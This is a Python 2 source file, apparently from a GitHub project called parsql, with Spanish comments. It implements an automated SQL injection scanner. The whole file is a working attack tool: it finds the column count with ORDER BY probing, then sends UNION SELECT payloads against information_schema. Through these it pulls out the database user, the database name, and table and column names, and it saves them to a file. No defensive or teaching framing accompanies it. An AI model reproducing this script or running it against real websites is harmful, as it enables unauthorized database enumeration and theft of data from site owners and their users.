# https://github.com/favarristan/parsql/

from urlparse import urlparse
from collections import OrderedDict
from bs4 import BeautifulSoup
from pprint import pprint
import requests, sys, difflib, array, re, argparse, urllib

# Variables
reload(sys)
sys.setdefaultencoding('utf-8')
rango    = 100
columnas = []

# Funciones

# Define Argumentos
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", help="URL a escanear")
parser.add_argument("-t", "--table", help="Tabla a inyectar")
args = parser.parse_args()
if args.url:
    urlbase = args.url
else:
    print "Defina URL con el argumento -u o --URL"
    sys.exit()
args = parser.parse_args()
if args.table:
    table = args.table
    
# Agrega ORDER BY
def order( url, num ):
    parts = urlparse(url)
    url   = url.replace(parts.query, 'id=-1+ORDER+BY+'+str(num)+'+--+')
    return url

# Obtener columna inyectable
def cual( url, num):
    x = 0
    stop  = '0'
    lista = '0'
    parts = urlparse(url)
    for x in range(1, int(num+1)):
        lista = lista+","+str(x)
    lista = lista[2:]
    url   = url.replace(parts.query, 'id=-1+UNION+SELECT+'+str(lista)+'+FROM+information_schema.tables+--+')
    for x in range(1, int(num+1)):
        url2 = re.sub(str(x)+',', 'CONCAT(USER(),0x79216f2d642161),', url, 1)
        html = respo(url2)
        soup = BeautifulSoup(html, "lxml")
        for elem in soup(text=re.compile(r'y!o-d!a')):
            if 'y!o-d!a' in elem:
                stop = x
                break
        else:
            continue
        break
    return x
    
# Obtiene columnas
def columnas( tabla, url, num, cual ):
    cols  = []
    parts = urlparse(url)
    lista = '0'
    for x in range(1, int(num+1)):
        if x == cual:
            lista = lista+',GROUP_CONCAT(column_name,0x79216f2d642161)'
        else:
            lista = lista+","+str(x)
    lista = lista[2:]
    tabla = ''.join(x.encode('hex') for x in tabla)
    tabla = '0x'+str(tabla)
    url   = url.replace(parts.query, 'id=-1+UNION+SELECT+'+str(lista)+'+FROM+information_schema.columns+WHERE+table_name='+str(tabla)+'+--+')
    html = respo(url)
    soup = BeautifulSoup(html, "lxml")
    for elem in soup(text=re.compile(r'y!o-d!a')):
        if 'y!o-d!a' in elem:
            elem = elem.replace('y!o-d!a', '')
            elem = elem.replace('\r', '')
            elem = elem.replace('\n', '')
            elem = elem.replace('\t', '')
            elem = elem.replace(' ', '')
            elem = elem.replace('	', '')
            cols.append(elem)
            break
        else:
            continue
    return cols

# Obtiene username
def username( url, num, cual ):
    uname = '0'
    lista = '0'
    parts = urlparse(url)    
    for x in range(1, int(num+1)):
        if x == cual:
            lista = lista+',CONCAT(USER(),0x79216f2d642161)'
        else:
            lista = lista+","+str(x)
    lista = lista[2:]
    url   = url.replace(parts.query, 'id=-1+UNION+SELECT+'+str(lista)+'+FROM+information_schema.tables+--+')
    html = respo(url)
    soup = BeautifulSoup(html, "lxml")
    for elem in soup(text=re.compile(r'y!o-d!a')):
        if 'y!o-d!a' in elem:
            uname = elem
            break
        else:
            continue 
    if uname != '0':
        uname = uname.replace('y!o-d!a', '')
    else:
        uname = 'No encontrado'
    return uname

# Obtiene nombre de base de datos actual
def bdname( url, num, cual ):
    bd    = '0'    
    lista = '0'
    parts = urlparse(url)
    for x in range(1, int(num+1)):
        if x == cual:
            lista = lista+',CONCAT(DATABASE(),0x79216f2d642161)'
        else:
            lista = lista+","+str(x)    
    lista = lista[2:]
    url   = url.replace(parts.query, 'id=-1+UNION+SELECT+'+str(lista)+'+FROM+information_schema.tables+--+')
    html = respo(url)
    soup = BeautifulSoup(html, "lxml")
    for elem in soup(text=re.compile(r'y!o-d!a')):
        if 'y!o-d!a' in elem:
            bd = elem
            break
        else:
            continue
    if bd != '0':
        bd = bd.replace('y!o-d!a', '')
    else:
        bd = 'No encontrado'
    return bd

# Agrega UNION
def union( url, num ):
    parts = urlparse(url)
    lista = '0'
    for x in range(1, int(num+1)):
        lista = lista+",CONCAT(table_name,table_type,0x2c)"
    lista = lista[2:]
    url   = url.replace(parts.query, 'id=-1+UNION+SELECT+'+str(lista)+'+FROM+information_schema.tables+--+')
    return url

# Iterar Tables
def iterar( elem ):
    element = elem.parent
    for x in range(1, 100):
        elementstr = str(element)
        if 'COLUMNS' in elementstr:              
           element = element.get_text()
           element = element.rstrip('\n')
           break
        else:
           element = element.parent   
    return element

# Buscar por limit
def limit( url, num, cual ):
    ret   = []
    parts = urlparse(url)
    lista = '0'
    for x in range(1, int(num+1)):
        if x == cual:
            lista = lista+',CONCAT(table_name,table_type,0x79216f2d642161)'
        else:
            lista = lista+","+str(x)
    lista = lista[2:]
    url   = url.replace(parts.query, 'id=-1+UNION+SELECT+'+str(lista)+'+FROM+information_schema.tables+--+')
    html = respo(url)
    soup = BeautifulSoup(html, "lxml")
    elem = soup.body.find(text=re.compile('y!o-d!a'))
    url = url.replace('+--+', '+LIMIT+1,1+--+')
    for x in range(1, 1000):
        url  = url.replace('LIMIT+' + str(x-1)+',1', 'LIMIT+' + str(x)+',1')
        print 'Buscando por LIMIT '+str(x)+',1...'
        html = respo(url)
        soup = BeautifulSoup(html, "lxml")
        elem = soup.body.find(text=re.compile('y!o-d!a'))
        if elem:
            elem = str(elem)
            if 'SYSTEM VIEW' in elem:
                pass
            else:
                elem = elem.replace('BASE TABLE', '')
                elem = elem.replace('y!o-d!a', '')
                elem = elem.replace('\r', '')
                elem = elem.replace('\n', '')
                elem = elem.replace(' ', '')
                elem = elem.replace('	', '')
                ret.append(elem)
                ret   = filter(None, ret)
        else:
            break
    return ret
    
# Buscar TABLES
def tables( url, cols, cual ):
    ret     = []
    element = '0'
    html = respo(url)
    soup = BeautifulSoup(html, "lxml")
    for elem in soup(text=re.compile(r'TABLES')):
        element = iterar(elem)
    if element == '0':
        url  = url.replace('CONCAT', 'GROUP_CONCAT')
        html = respo(url)
        soup = BeautifulSoup(html, "lxml")
        for elem in soup(text=re.compile(r'TABLES')):
            element = iterar(elem)
    else:
        pass
    element_ret = element.split(',')
    for elem in element_ret:
        if 'SYSTEM VIEW' in elem:
            pass
        else:
            elem = elem.replace('BASE TABLE', '')
            elem = elem.replace('\r', '')
            elem = elem.replace('\n', '')
            elem = elem.replace(' ', '')
            elem = elem.replace('	', '')
            elem = elem.encode("ascii")
            ret.append(elem)
    ret   = filter(None, ret)
    retsn = 0
    for rets in ret:
        retsn = retsn + 1
    if retsn == 1:
        ret = limit(url, cols, cual)
    return ret
    
# Quitar disti
def disti( index ):
    index = str(index)
    index = index.replace('disti', '')
    index = index.replace('igual', '')
    index = index.replace('-', '')
    return index 

# Quitar igual
def igual( index ):
    index = str(index)
    index = index.replace('igual', '')
    index = index.replace('disti', '')
    index = index.replace('-', '')
    return index 

# Busca entre Mitades
def mitad(urlbase):
    midpoint = 0
    first = 1
    last  = 100
    url1  = order(urlbase, first)
    html1 = respo(url1)
    html1 = sacar(html1, first)
    while first<=last:
        url2    =   order(urlbase, last)
        html2   =   respo(url2)
        html2   =   sacar(html2, last)
        resp    =   compara(html1, html2)
        if resp == "disti":
            midpoint = (first + last)//2
            url2    =   order(urlbase, midpoint)
            html2   =   respo(url2)
            html2   =   sacar(html2, midpoint)
            resp    =   compara(html1, html2)
            if resp == "disti":
                last = midpoint-1
            else:
                if resp == "igual":
                    first = midpoint+1
        else:
            break
    return (midpoint-1)
       
# Compara
def compara( html1, html2 ):
    if html1 == html2:
        resp = 'igual'
    else:
        resp = 'disti'       
    return resp
    
# Obtiene respuesta
def respo( url ):

    #http_proxy  = "http://proxy.bsch.ar:8080"
    #https_proxy = "https://proxy.bsch.ar:8080"
    #ftp_proxy   = "ftp://proxy.bsch.ar:8080"

    #proxyDict = { 
    #  "http"  : http_proxy, 
    #  "https" : https_proxy,
    #  "ftp"   : ftp_proxy
    #}
    #response  = requests.get(url)
    #response  = requests.get(url, headers=headers, proxies=proxyDict)
    response  = requests.get(url, proxies=urllib.getproxies())
    print url
    print response
    html      = response.text
    return html      
    
# Quita order by de HTML
def sacar( html, num ):
    muestra1  = '1 ORDER BY '+str(num)+' --'
    muestra2  = "Unknown column '"+str(num)+"' in"
    if muestra1 in html:
        html = html.replace(muestra1, '')
    else:
        pass
    if muestra2 in html:
        html = html.replace(muestra2, '')
    else:
        pass
    return html

# Main

filename = 'output'
col      = {}
url      = order(urlbase, rango)
html1    = respo(urlbase)
html2    = respo(url)
resp     = compara(html1, html2)  
if resp == 'igual':
    print 'No inyectable'
else:
    columna = mitad(urlbase)       
    url     = union(urlbase, int(columna))
    cual    = cual(urlbase, int(columna))
    user = username(urlbase, int(columna), cual)
    user = user.replace(' ', '')
    user = user.replace('	', '')
    bdna = bdname(urlbase, int(columna), cual)
    bdna = bdna.replace(' ', '')    
    bdna = bdna.replace('	', '')
    ele  = tables(url, columna, cual)
    for el in ele:
        el = el.replace(' ', '')
        el = el.replace('	', '') 
        cols = columnas(str(el),urlbase,int(columna), cual)
        col[str(el)] = cols
    col = dict((k, v) for k, v in col.iteritems() if v)    
    print 'Columnas de tablas:'
    for k, v in col.iteritems():
        print '\n'
        print 'Tabla: '+k
        for val in v:
            val = val.replace(',', '\n     ')
            print '     '+val
    print '\n############################\n'
    print 'Numero de columnas en tabla actual:'+str(columna)
    print '\n############################\n'
    print 'Tablas en base:'
    for el in ele:
        print el
    print '\n############################\n'
    print 'Usuario:'+str(user)
    print '\n############################\n'
    print 'Base de datos:'+str(bdna)
    if bdna:
        filename = bdna
        print '\n############################\n'
    else:
        pass
    text_file = open(str(bdna)+'.txt', 'w')
    text_file.write('Usuario:'+str(user)+'\r\n###################\r\n'+'Base de datos:'+str(bdna)+'\r\n###################\r\nTablas en base:'+str(ele)+'\r\n###################\r\n'+'Columnas de tablas:'+str(col))
    text_file.close()
    print 'Archivo '+filename+'.txt creado'
